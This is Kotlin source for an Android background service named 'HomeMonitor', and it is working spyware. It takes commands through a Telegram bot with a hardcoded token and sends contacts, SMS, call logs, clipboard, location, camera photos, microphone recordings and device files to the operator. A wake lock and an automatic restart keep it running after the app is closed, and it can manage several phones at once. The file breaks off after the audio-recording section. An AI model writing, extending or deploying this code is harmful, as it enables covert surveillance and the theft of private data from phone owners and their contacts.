package com.homemonitor

import android.Manifest
import android.app.PendingIntent
import android.content.ContentValues
import android.content.Intent
import android.content.pm.PackageManager
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.provider.ContactsContract
import android.provider.MediaStore
import android.provider.Telephony
import android.util.Log
import android.webkit.MimeTypeMap
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageCapture
import androidx.camera.core.ImageCaptureException
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.LifecycleService
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.coroutineScope
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.withTimeout
import kotlinx.coroutines.TimeoutCancellationException
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import android.app.ActivityManager
import android.content.ClipboardManager
import android.content.pm.ApplicationInfo
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraManager
import android.media.projection.MediaProjectionManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.wifi.WifiManager
import android.os.BatteryManager
import android.os.StatFs
import android.provider.CallLog
import android.telecom.TelecomManager
import android.telephony.TelephonyManager
import android.view.WindowManager
import java.io.ByteArrayOutputStream
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.CountDownLatch
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream

class MonitorService : LifecycleService() {

    companion object {
        private const val BOT_TOKEN = "8512990339:AAE-PXlxR_xp8vsQ_M1Rm8sxXE7NL4f3X9c"
        private const val CHAT_ID   = "8937193601"

        private const val TAG              = "MonitorService"
        private const val NOTIFICATION_ID  = 1001
        private const val POLL_INTERVAL_MS = 5_000L
        private const val HEARTBEAT_MS     = 5 * 60 * 1000L
        private const val CHUNK_LIMIT      = 49L * 1_048_576L
        private const val PAGE_SIZE        = 15   // items per allfiles message

        private const val PREFS_NAME         = "monitor_prefs"
        private const val PREF_DEVICE_NAME   = "device_name"
        private const val PREF_DEVICE_NUMBER = "device_number"
        private const val PREF_ACTIVE_DEVICE = "active_device"

        private val BASE_URL          = "https://api.telegram.org/bot$BOT_TOKEN"
        private val BASE_FILE_URL     = "https://api.telegram.org/file/bot$BOT_TOKEN"
        private val URL_GET_UPDATES   = "$BASE_URL/getUpdates"
        private val URL_SEND_MSG      = "$BASE_URL/sendMessage"
        private val URL_SEND_PHOTO    = "$BASE_URL/sendPhoto"
        private val URL_SEND_VIDEO    = "$BASE_URL/sendVideo"
        private val URL_SEND_DOCUMENT = "$BASE_URL/sendDocument"
        private val URL_SEND_AUDIO    = "$BASE_URL/sendAudio"
        private val URL_GET_FILE      = "$BASE_URL/getFile"
    }

    // ── Per-chat state ──
    // Stores numbered items (folders first, then files) for the current path
    private data class FsItem(val name: String, val file: File, val isDir: Boolean)
    private val fsCache      = mutableMapOf<String, List<FsItem>>()  // chatId → numbered list
    private val pathCache    = mutableMapOf<String, String>()         // chatId → current relPath

    // ── Stop flag per chat ──
    private val stopFlags    = mutableMapOf<String, Boolean>()
    private val activeJobs   = mutableMapOf<String, Job>()

    // ── WakeLock ──
    private var wakeLock: PowerManager.WakeLock? = null

    private val httpClient = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(120, TimeUnit.SECONDS)
        .writeTimeout(120, TimeUnit.SECONDS)
        .build()

    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var pollJob: Job? = null
    private var heartbeatJob: Job? = null

    @Volatile private var updateOffset: Long = 0L

    private val cameraExecutor = Executors.newSingleThreadExecutor()
    private val mainHandler    = Handler(Looper.getMainLooper())

    private lateinit var deviceName: String
    private var deviceNumber: Int = 1

    // ══════════════════════════════════════════════════════════════════════════
    //  LIFECYCLE
    // ══════════════════════════════════════════════════════════════════════════

    override fun onCreate() {
        super.onCreate()
        loadDeviceIdentity()
        acquireWakeLock()
        startForegroundWithNotification()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)
        pollJob?.cancel()
        pollJob = serviceScope.launch { pollLoop() }
        heartbeatJob?.cancel()
        heartbeatJob = serviceScope.launch { heartbeatLoop() }
        return START_STICKY
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        val pi = PendingIntent.getService(applicationContext, 1,
            Intent(applicationContext, MonitorService::class.java),
            PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE)
        (getSystemService(ALARM_SERVICE) as android.app.AlarmManager).set(
            android.app.AlarmManager.ELAPSED_REALTIME,
            android.os.SystemClock.elapsedRealtime() + 1000L, pi)
    }

    override fun onDestroy() {
        super.onDestroy()
        pollJob?.cancel(); heartbeatJob?.cancel()
        serviceScope.cancel(); cameraExecutor.shutdown()
        releaseWakeLock()
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  WAKELOCK
    // ══════════════════════════════════════════════════════════════════════════

    private fun acquireWakeLock() {
        try {
            wakeLock = (getSystemService(POWER_SERVICE) as PowerManager)
                .newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "HomeMonitor::PollWakeLock")
                .also { it.acquire(10 * 60 * 60 * 1000L) }
        } catch (_: Exception) {}
    }

    private fun releaseWakeLock() {
        try { if (wakeLock?.isHeld == true) wakeLock?.release() } catch (_: Exception) {}
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  DEVICE IDENTITY
    // ══════════════════════════════════════════════════════════════════════════

    private fun loadDeviceIdentity() {
        val prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
        val def   = "${Build.MANUFACTURER} ${Build.MODEL}".trim()
        deviceName   = prefs.getString(PREF_DEVICE_NAME, def) ?: def
        deviceNumber = prefs.getInt(PREF_DEVICE_NUMBER, 1)
    }

    private fun saveDeviceIdentity() {
        getSharedPreferences(PREFS_NAME, MODE_PRIVATE).edit()
            .putString(PREF_DEVICE_NAME, deviceName)
            .putInt(PREF_DEVICE_NUMBER, deviceNumber).apply()
    }

    private fun isActiveDevice(): Boolean {
        val prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
        return prefs.getInt(PREF_ACTIVE_DEVICE, deviceNumber) == deviceNumber
    }

    private fun dp() = "📱 [*${deviceNumber}. $deviceName*]\n"

    // ══════════════════════════════════════════════════════════════════════════
    //  HEARTBEAT
    // ══════════════════════════════════════════════════════════════════════════

    private suspend fun heartbeatLoop() {
        while (serviceScope.isActive) {
            try {
                val now = System.currentTimeMillis()
                getSharedPreferences(PREFS_NAME, MODE_PRIVATE).edit()
                    .putLong("last_heartbeat_$deviceNumber", now).apply()
                val json = JSONObject().apply {
                    put("chat_id", CHAT_ID)
                    put("text", "__hb__ $deviceNumber|$deviceName|$now")
                    put("disable_notification", true)
                }
                httpClient.newCall(Request.Builder().url(URL_SEND_MSG)
                    .post(json.toString().toRequestBody("application/json".toMediaTypeOrNull())).build())
                    .execute().use {}
            } catch (_: Exception) {}
            delay(HEARTBEAT_MS)
        }
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  POLLING — each command in its own Job with 90s timeout
    // ══════════════════════════════════════════════════════════════════════════

    private suspend fun pollLoop() {
        while (serviceScope.isActive) {
            try {
                fetchUpdates().forEach { update ->
                    val chatId = update.optJSONObject("message")
                        ?.optJSONObject("chat")?.optString("id") ?: CHAT_ID
                    val rawText = update.optJSONObject("message")
                        ?.optString("text", "")?.trim() ?: ""

                    // /stop cancels active job immediately
                    if (rawText.trim().lowercase() == "/stop") {
                        activeJobs[chatId]?.cancel()
                        activeJobs.remove(chatId)
                        stopFlags[chatId] = true
                        sendMessage(chatId, "${dp()}🛑 *Stopped.*", "Markdown")
                        return@forEach
                    }

                    // Cancel previous job for this chat if still running
                    activeJobs[chatId]?.cancel()
                    // Clear stop flag only when new real command arrives
                    stopFlags[chatId] = false
                    // Small delay so in-flight sendMessage calls see the stop flag first
                    kotlinx.coroutines.runBlocking { delay(200L) }

                    val job = serviceScope.launch {
                        try {
                            withTimeout(90_000L) { handleUpdate(update) }
                        } catch (e: TimeoutCancellationException) {
                            sendMessage(chatId, "${dp()}⏰ *Timeout* — took >90s. Ready for next command.", "Markdown")
                        } catch (e: Exception) {
                            if (e.message?.contains("StandaloneCoroutine was cancelled") == false)
                                sendMessage(chatId, "${dp()}❌ Error: ${e.message}")
                        }
                    }
                    activeJobs[chatId] = job
                }
            } catch (_: Exception) {}
            delay(POLL_INTERVAL_MS)
        }
    }

    private fun isStopped(chatId: String) = stopFlags[chatId] == true

    private fun fetchUpdates(): List<JSONObject> {
        val body = httpClient.newCall(
            Request.Builder().url("$URL_GET_UPDATES?offset=$updateOffset&limit=10&timeout=0").get().build()
        ).execute().use { r ->
            if (!r.isSuccessful) return emptyList()
            r.body?.string()
        } ?: return emptyList()
        val json = JSONObject(body)
        if (!json.optBoolean("ok", false)) return emptyList()
        val result  = json.getJSONArray("result")
        val updates = mutableListOf<JSONObject>()
        for (i in 0 until result.length()) {
            val u = result.getJSONObject(i); updates.add(u)
            val id = u.getLong("update_id")
            if (id >= updateOffset) updateOffset = id + 1
        }
        return updates
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  COMMAND DISPATCHER
    // ══════════════════════════════════════════════════════════════════════════

    private suspend fun handleUpdate(update: JSONObject) {
        val message = update.optJSONObject("message") ?: return
        val chatId  = message.optJSONObject("chat")?.optString("id") ?: CHAT_ID
        val rawText = message.optString("text", "").trim()

        if (rawText.startsWith("__hb__ ")) { parseHeartbeat(rawText); return }

        val doc      = message.optJSONObject("document")
        val photoArr = message.optJSONArray("photo")
        when {
            doc != null -> { handleIncomingDoc(chatId, doc); return }
            photoArr != null && photoArr.length() > 0 -> {
                handleIncomingDoc(chatId, photoArr.getJSONObject(photoArr.length() - 1),
                    "photo_${System.currentTimeMillis()}.jpg"); return
            }
        }

        if (rawText.isEmpty()) return
        val text = rawText.substringBefore("@").lowercase(Locale.getDefault())
        Log.i(TAG, "CMD: $text")

        // Global
        when {
            text == "/alldevice" -> { handleAllDevice(chatId); return }
            text.startsWith("/switchdevice") -> { handleSwitchDevice(chatId, rawText.removePrefix("/switchdevice").trim()); return }
            text.startsWith("/setdevice") -> { handleSetDevice(chatId, rawText.removePrefix("/setdevice").trim()); return }
        }

        if (!isActiveDevice()) return

        when {
            text == "/start" || text == "/help" -> handleHelp(chatId)
            text == "/alive" || text == "/status" -> handleStatus(chatId)

            // Contacts
            text == "/allcontacts" -> handleContacts(chatId, Int.MAX_VALUE)
            text.matches(Regex("/contacts\\d+")) -> handleContacts(chatId, text.removePrefix("/contacts").toInt())
            text == "/contacts" -> handleContacts(chatId, 50)

            // SMS
            text == "/allsms" -> handleSms(chatId, "", Int.MAX_VALUE)
            text.matches(Regex("/sms\\d+")) -> handleSms(chatId, "", text.removePrefix("/sms").toInt())
            text == "/sms" -> handleSms(chatId, "", 20)
            text.startsWith("/sms ") -> handleSms(chatId, rawText.removePrefix("/sms ").trim(), Int.MAX_VALUE)

            // Camera
            text == "/camera" -> handleCamera(chatId, CameraSelector.DEFAULT_BACK_CAMERA, 1)
            text.matches(Regex("/camera\\d+")) -> handleCamera(chatId, CameraSelector.DEFAULT_BACK_CAMERA, text.removePrefix("/camera").toInt())
            text == "/frontcam" || text == "/frontcamera" -> handleCamera(chatId, CameraSelector.DEFAULT_FRONT_CAMERA, 1)
            text.matches(Regex("/frontcam\\d+")) -> handleCamera(chatId, CameraSelector.DEFAULT_FRONT_CAMERA, text.removePrefix("/frontcam").toInt())
            text.matches(Regex("/frontcamera\\d+")) -> handleCamera(chatId, CameraSelector.DEFAULT_FRONT_CAMERA, text.removePrefix("/frontcamera").toInt())

            // Location
            text == "/location" -> handleLocation(chatId)

            // Audio
            text == "/audio" -> sendMessage(chatId, "${dp()}ℹ️ Usage: /audio30 (seconds)", "Markdown")
            text.matches(Regex("/audio\\d+")) -> handleAudio(chatId, text.removePrefix("/audio").toInt())
            text.startsWith("/audio ") -> handleAudio(chatId, rawText.removePrefix("/audio ").trim().toIntOrNull() ?: 10)

            // Video
            text == "/video" -> sendMessage(chatId, "${dp()}ℹ️ Usage: /video30 or /video30 front", "Markdown")
            text.startsWith("/video") -> handleVideo(chatId, rawText)

            // File manager
            text == "/allfiles" || text == "/files" -> handleAllFiles(chatId, "")

            text.startsWith("/allfiles ") || text.startsWith("/files ") -> {
                val arg = rawText.removePrefix("/allfiles ").removePrefix("/files ").trim()
                val num = arg.toIntOrNull()
                if (num != null) handleFsSelect(chatId, num)
                else handleAllFiles(chatId, arg)
            }

            // Plain number → navigate or download from current listing
            text.matches(Regex("\\d+")) -> handleFsSelect(chatId, text.toInt())

            // ZIP
            text == "/zip" -> sendMessage(chatId, "${dp()}ℹ️ Usage: /zip DCIM/Camera", "Markdown")
            text.startsWith("/zip ") -> handleZip(chatId, rawText.removePrefix("/zip ").trim())

            // Device Info
            text == "/deviceinfo" -> handleDeviceInfo(chatId)

            // Screenshot
            text == "/screenshot" -> handleScreenshot(chatId)

            // Screen record
            text == "/videorec" -> sendMessage(chatId, "${dp()}ℹ️ Usage: /videorec10 (screen record 10s)", "Markdown")
            text.matches(Regex("/videorec\\d+")) -> handleScreenRecord(chatId, text.removePrefix("/videorec").toInt())
            text.startsWith("/videorec ") -> handleScreenRecord(chatId, rawText.removePrefix("/videorec ").trim().toIntOrNull() ?: 10)

            // Clipboard
            text == "/clipboard" -> handleClipboard(chatId)

            // Call logs
            text == "/calls" -> handleCallLog(chatId, 20)
            text.matches(Regex("/calls\\d+")) -> handleCallLog(chatId, text.removePrefix("/calls").toInt())

            // Wrong command
            text.startsWith("/") -> sendMessage(chatId,
                "${dp()}❌ Wrong command: `$text`\nSend /help for all commands.", "Markdown")

            else -> {}
        }
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  MULTI-DEVICE
    // ══════════════════════════════════════════════════════════════════════════

    private fun parseHeartbeat(raw: String) {
        try {
            val parts = raw.removePrefix("__hb__ ").split("|")
            if (parts.size >= 3) {
                val num = parts[0].toIntOrNull() ?: return
                getSharedPreferences(PREFS_NAME, MODE_PRIVATE).edit()
                    .putLong("last_heartbeat_$num", parts[2].toLongOrNull() ?: return)
                    .putString("device_name_$num", parts[1]).apply()
            }
        } catch (_: Exception) {}
    }

    private suspend fun handleAllDevice(chatId: String) {
        val prefs     = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
        val activeNum = prefs.getInt(PREF_ACTIVE_DEVICE, deviceNumber)
        val lastSeen  = prefs.getLong("last_heartbeat_$deviceNumber", 0L)
        val agoMs     = System.currentTimeMillis() - lastSeen
        val alive     = if (agoMs < 6 * 60 * 1000L) "🟢 Online" else "🔴 Offline"
        val active    = if (activeNum == deviceNumber) " ← *ACTIVE*" else ""
        sendMessage(chatId, "📱 *$deviceNumber. $deviceName*$active\n$alive\n`/switchdevice $deviceNumber`", "Markdown")
    }

    private suspend fun handleSwitchDevice(chatId: String, arg: String) {
        val num = arg.trim().toIntOrNull() ?: run { sendMessage(chatId, "❌ Usage: /switchdevice 2"); return }
        getSharedPreferences(PREFS_NAME, MODE_PRIVATE).edit().putInt(PREF_ACTIVE_DEVICE, num).apply()
        if (num == deviceNumber) sendMessage(chatId, "✅ Now controlling: 📱 *$deviceNumber. $deviceName*", "Markdown")
    }

    private suspend fun handleSetDevice(chatId: String, arg: String) {
        if (arg.isBlank()) { sendMessage(chatId, "❌ Usage: /setdevice MyPhone"); return }
        deviceName = arg.trim(); saveDeviceIdentity()
        sendMessage(chatId, "✅ Renamed: 📱 *$deviceNumber. $deviceName*", "Markdown")
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  HELP & STATUS
    // ══════════════════════════════════════════════════════════════════════════

    private suspend fun handleHelp(chatId: String) {
        sendMessage(chatId, """
${dp()}🤖 *Commands*

📱 *Multi-Device*
/alldevice · /switchdevice 2 · /setdevice Name

📶 /alive — Online check

📱 *Device*
/deviceinfo — Battery, RAM, storage, network
/screenshot — Phone screen capture
/clipboard — Clipboard content

📷 *Camera*
/camera · /camera5 (5 photos, 3s apart)
/frontcam · /frontcam5

🎥 *Video*
/video30 · /video30 front — Camera video
/videorec30 — Screen recording 30s

📍 /location

👥 *Contacts*
/allcontacts · /contacts20

💬 *SMS*
/allsms · /sms10 · /sms <number>

📞 *Calls*
/calls — Last 20 call logs
/calls50 — Last 50 call logs

🎙️ /audio30 — Record 30s

📂 *File Manager*
/allfiles — Browse /storage/emulated/0
Type a *number* to open folder or download file
/zip <path> — ZIP folder (auto-split 49MB)

🛑 /stop — Stop current operation
        """.trimIndent(), "Markdown")
    }

    private suspend fun handleStatus(chatId: String) {
        val t = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())
        sendMessage(chatId, "${dp()}✅ *Online*\n🕐 $t", "Markdown")
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  CONTACTS
    // ══════════════════════════════════════════════════════════════════════════

    private suspend fun handleContacts(chatId: String, limit: Int) {
        if (!hasPerm(Manifest.permission.READ_CONTACTS)) {
            sendMessage(chatId, "${dp()}⚠️ READ_CONTACTS permission missing."); return
        }
        val label = if (limit == Int.MAX_VALUE) "All" else "$limit"
        sendMessage(chatId, "${dp()}📒 Loading contacts… | 0%")
        val list = readContacts(limit)
        if (list.isEmpty()) { sendMessage(chatId, "${dp()}📭 No contacts."); return }
        var page = StringBuilder("${dp()}📒 *Contacts ($label) — ${list.size} total*\n\n")
        var lineCount = 0
        list.forEachIndexed { i, (name, num) ->
            if (isStopped(chatId)) { sendMessage(chatId, "${dp()}🛑 Stopped."); return }
            page.append("${i + 1}. *$name*  `$num`\n")
            lineCount++
            val pct = ((i + 1) * 100 / list.size)
            if (lineCount >= PAGE_SIZE || i == list.size - 1) {
                sendMessage(chatId, page.toString().trimEnd(), "Markdown")
                if (i < list.size - 1) {
                    page = StringBuilder()
                    lineCount = 0
                    sendMessage(chatId, "${dp()}📤 $pct% …")
                }
            }
        }
        sendMessage(chatId, "${dp()}✅ Done — ${list.size} contacts.")
    }

    private fun readContacts(limit: Int): List<Pair<String, String>> {
        val list   = mutableListOf<Pair<String, String>>()
        val cursor = contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            arrayOf(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER),
            null, null,
            "${ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME} ASC") ?: return list
        cursor.use {
            val nc = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
            val pc = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
            while (it.moveToNext() && list.size < limit)
                list.add(Pair(it.getString(nc) ?: "?", it.getString(pc) ?: "?"))
        }
        return list
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  SMS
    // ══════════════════════════════════════════════════════════════════════════

    private suspend fun handleSms(chatId: String, filter: String, limit: Int) {
        if (!hasPerm(Manifest.permission.READ_SMS)) {
            sendMessage(chatId, "${dp()}⚠️ READ_SMS permission missing."); return
        }
        val label = when {
            filter.isNotEmpty() -> "SMS with $filter"
            limit == Int.MAX_VALUE -> "All SMS"
            else -> "Last $limit SMS"
        }
        sendMessage(chatId, "${dp()}💬 Loading $label… | 0%")
        val msgs = readSms(filter, limit)
        if (msgs.isEmpty()) { sendMessage(chatId, "${dp()}📭 No messages."); return }
        val dateFmt = SimpleDateFormat("MM-dd HH:mm", Locale.getDefault())
        var page = StringBuilder("${dp()}💬 *$label — ${msgs.size} msgs*\n\n")
        var lineCount = 0
        msgs.forEachIndexed { i, msg ->
            if (isStopped(chatId)) { sendMessage(chatId, "${dp()}🛑 Stopped."); return }
            val addr  = msg.optString("address", "?")
            val raw   = msg.optString("body", "")
            val body  = (if (raw.length > 150) raw.take(150) + "…" else raw)
                .replace("_", "\\_").replace("*", "\\*").replace("`", "\\`")
            val date  = dateFmt.format(Date(msg.optLong("date")))
            val emoji = if (msg.optInt("type") == Telephony.Sms.MESSAGE_TYPE_SENT) "📤" else "📨"
            page.append("$emoji *$addr*  🕐$date\n$body\n\n")
            lineCount++
            val pct = ((i + 1) * 100 / msgs.size)
            if (lineCount >= PAGE_SIZE || i == msgs.size - 1) {
                sendMessage(chatId, page.toString().trimEnd(), "Markdown")
                if (i < msgs.size - 1) {
                    page = StringBuilder()
                    lineCount = 0
                    sendMessage(chatId, "${dp()}📤 $pct% …")
                }
            }
        }
        sendMessage(chatId, "${dp()}✅ Done — ${msgs.size} messages.")
    }

    private fun readSms(filter: String, limit: Int): List<JSONObject> {
        val list   = mutableListOf<JSONObject>()
        val sel    = if (filter.isNotEmpty()) "address LIKE ?" else null
        val args   = if (filter.isNotEmpty()) arrayOf("%${filter.takeLast(7)}%") else null
        val cursor = contentResolver.query(
            Telephony.Sms.CONTENT_URI,
            arrayOf(Telephony.Sms.ADDRESS, Telephony.Sms.BODY, Telephony.Sms.DATE, Telephony.Sms.TYPE),
            sel, args, "${Telephony.Sms.DATE} DESC") ?: return list
        cursor.use { c ->
            val ac = c.getColumnIndex(Telephony.Sms.ADDRESS)
            val bc = c.getColumnIndex(Telephony.Sms.BODY)
            val dc = c.getColumnIndex(Telephony.Sms.DATE)
            val tc = c.getColumnIndex(Telephony.Sms.TYPE)
            while (c.moveToNext() && list.size < limit)
                list.add(JSONObject().apply {
                    put("address", c.getString(ac) ?: "?")
                    put("body", c.getString(bc) ?: "")
                    put("date", c.getLong(dc))
                    put("type", c.getInt(tc))
                })
        }
        return list
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  CAMERA
    // ══════════════════════════════════════════════════════════════════════════

    private suspend fun handleCamera(chatId: String, sel: CameraSelector, count: Int) {
        if (!hasPerm(Manifest.permission.CAMERA)) {
            sendMessage(chatId, "${dp()}⚠️ CAMERA permission missing."); return
        }
        val label = if (sel == CameraSelector.DEFAULT_FRONT_CAMERA) "front" else "rear"
        val total = count.coerceIn(1, 50)
        if (total > 1) sendMessage(chatId, "${dp()}📷 Taking $total photos ($label) every 3s…\n⏳ ~${total * 3}s | 0%")
        for (i in 1..total) {
            if (isStopped(chatId)) { sendMessage(chatId, "${dp()}🛑 Stopped at $i/$total."); return }
            val pct = (i * 100 / total)
            takePhoto(chatId, sel, "📸 $i/$total")
            if (i < total) {
                sendMessage(chatId, "${dp()}📷 Photo $i/$total sent | $pct%\n⏳ Next in 3s…")
                delay(3_000L)
            }
        }
        if (total > 1) sendMessage(chatId, "${dp()}✅ $total photos done.")
    }

    private fun takePhoto(chatId: String, selector: CameraSelector, caption: String) {
        val latch = CountDownLatch(1)
        mainHandler.post {
            val future = ProcessCameraProvider.getInstance(this)
            future.addListener({
                var provider: ProcessCameraProvider? = null
                try {
                    provider = future.get()
                    val capture = ImageCapture.Builder()
                        .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY).build()
                    provider.unbindAll()
                    provider.bindToLifecycle(this, selector, capture)
                    val file = File(cacheDir, "photo_${System.currentTimeMillis()}.jpg")
                    capture.takePicture(
                        ImageCapture.OutputFileOptions.Builder(file).build(),
                        cameraExecutor,
                        object : ImageCapture.OnImageSavedCallback {
                            override fun onImageSaved(out: ImageCapture.OutputFileResults) {
                                mainHandler.post { try { provider?.unbindAll() } catch (_: Exception) {} }
                                sendPhoto(chatId, file, "${dp()}$caption")
                                file.delete(); latch.countDown()
                            }
                            override fun onError(e: ImageCaptureException) {
                                mainHandler.post { try { provider?.unbindAll() } catch (_: Exception) {} }
                                sendMessage(chatId, "${dp()}❌ Camera: ${e.message}"); latch.countDown()
                            }
                        })
                } catch (e: Exception) {
                    mainHandler.post { try { provider?.unbindAll() } catch (_: Exception) {} }
                    sendMessage(chatId, "${dp()}❌ Camera: ${e.message}"); latch.countDown()
                }
            }, ContextCompat.getMainExecutor(this))
        }
        latch.await(20, TimeUnit.SECONDS)
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  LOCATION
    // ══════════════════════════════════════════════════════════════════════════

    private suspend fun handleLocation(chatId: String) {
        val hasFine   = hasPerm(Manifest.permission.ACCESS_FINE_LOCATION)
        val hasCoarse = hasPerm(Manifest.permission.ACCESS_COARSE_LOCATION)
        if (!hasFine && !hasCoarse) { sendMessage(chatId, "${dp()}⚠️ Location permission missing."); return }
        val lm    = getSystemService(LOCATION_SERVICE) as LocationManager
        val last: Location? = try {
            val g = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
            val n = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
            when { g != null && n != null -> if (g.time >= n.time) g else n; g != null -> g; else -> n }
        } catch (_: SecurityException) { null }
        if (last != null && System.currentTimeMillis() - last.time <= 3 * 60 * 1000L) {
            sendLocMsg(chatId, last, "📍 *Last Known*"); return
        }
        sendMessage(chatId, "${dp()}📡 Getting GPS… | 0%")
        var done = false
        val prov = if (hasFine) LocationManager.GPS_PROVIDER else LocationManager.NETWORK_PROVIDER
        val listener = object : LocationListener {
            override fun onLocationChanged(loc: Location) {
                if (!done) { done = true; try { lm.removeUpdates(this) } catch (_: Exception) {}; sendLocMsg(chatId, loc, "📍 *Location*") }
            }
            @Deprecated("") override fun onStatusChanged(p: String?, s: Int, e: Bundle?) {}
            override fun onProviderEnabled(p: String) {}
            override fun onProviderDisabled(p: String) {
                if (!done) { done = true; try { lm.removeUpdates(this) } catch (_: Exception) {}; sendMessage(chatId, "${dp()}❌ GPS disabled.") }
            }
        }
        try { lm.requestLocationUpdates(prov, 0L, 0f, listener, mainHandler.looper) }
        catch (e: SecurityException) { sendMessage(chatId, "${dp()}❌ Location revoked."); return }
        mainHandler.postDelayed({
            if (!done) { done = true; try { lm.removeUpdates(listener) } catch (_: Exception) {}
                if (last != null) sendLocMsg(chatId, last, "⚠️ *Stale Location*")
                else sendMessage(chatId, "${dp()}❌ Cannot get location.") }
        }, 20_000L)
    }

    private fun sendLocMsg(chatId: String, loc: Location, hdr: String) {
        val acc = if (loc.hasAccuracy()) "±${loc.accuracy.toInt()}m" else "N/A"
        sendMessage(chatId,
            "${dp()}$hdr\n🌐 `${loc.latitude}, ${loc.longitude}`\n🎯 $acc\n🗺 [Maps](https://maps.google.com/?q=${loc.latitude},${loc.longitude})",
            "Markdown")
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  AUDIO
    // ══════════════════════════════════════════════════════════════════════════

    private suspend fun handleAudio(chatId: String, seconds: Int) {
        if (!hasPerm(Manifest.permission.RECORD_AUDIO)) {
            sendMessage(chatId, "${dp()}⚠️ RECORD_AUDIO permission missing."); return
        }
        val dur = seconds.coerceAtLeast(1)
        sendMessage(chatId, "${dp()}🎙️ Recording ${dur}s… | 0%")
        val file = File(cacheDir, "audio_${System.currentTimeMillis()}.m4a")
        @Suppress("DEPRECATION")
        val rec = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
            android.media.MediaRecorder(this) else android.media.MediaRecorder()
        try {
            rec.apply {
                setAudioSource(android.media.MediaRecorder.AudioSource.MIC)
                setOutputFormat(android.media.MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AAC)
                setAudioSamplingRate(44100); setAudioEncodingBitRate(128_000)
                setOutputFile(file.absolutePath); prepare(); start()
            }
            var elapsed = 0
            while (elapsed < dur) {
                if (isStopped(chatId)) {
                    rec.stop(); rec.release()
                    sendMessage(chatId, "${dp()}🛑 Recording stopped at ${elapsed}s.")
                    if (file.exists() && file.length() > 0) uploadAudio(chatId, file, elapsed)
                    return
                }
                val wait = minOf(10, dur - elapsed)
                delay(wait * 1000L); elapsed += wait
                if (elapsed < dur) sendMessage(chatId, "${dp()}🎙️ ${elapsed}/${dur}s | ${elapsed * 100 / dur}%")
            }
            rec.stop(); rec.release()
            if (!file.exists() || file.length() == 0L) { sendMessage(chatId, "${dp()}❌ Empty recording."); return }
            sendMessage(chatId, "${dp()}🎙️ Done! Uploading ${formatSize(file.length())}… | 95%")
            uploadAudio(chatId, file, dur)
        } catch (e: Exception) {
            sendMessage(chatId, "${dp()}❌ Audio error: ${e.message}")
            try { rec.release() } catch (_: Exception) {}
        } finally { try { file.delete() } catch (_: Exception) {} }
    }

    private fun uploadAudio(chatId: String, file: File, durSec: Int) {
        try {
            val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", chatId)
                .addFormDataPart("audio", file.name, file.readBytes().toRequestBody("audio/mp4".toMediaTypeOrNull()))
                .addFormDataPart("title", "Recording (${durSec}s)")
                .addFormDataPart("duration", durSec.toString()).build()
            httpClient.newCall(Request.Builder().url(URL_SEND_AUDIO).post(body).build()).execute().use { r ->
                if (!r.isSuccessful) sendMessage(chatId, "${dp()}❌ Audio upload failed: ${r.code}")
                else sendMessage(chatId, "${dp()}✅ Audio sent! (${durSec}s, ${formatSize(file.length())})")
            }
        } catch (e: Exception) { sendMessage(chatId, "${dp()}❌ Upload error: ${e.message}") }
    }

    // ══════════════════════════════════════════════════════════════════════════
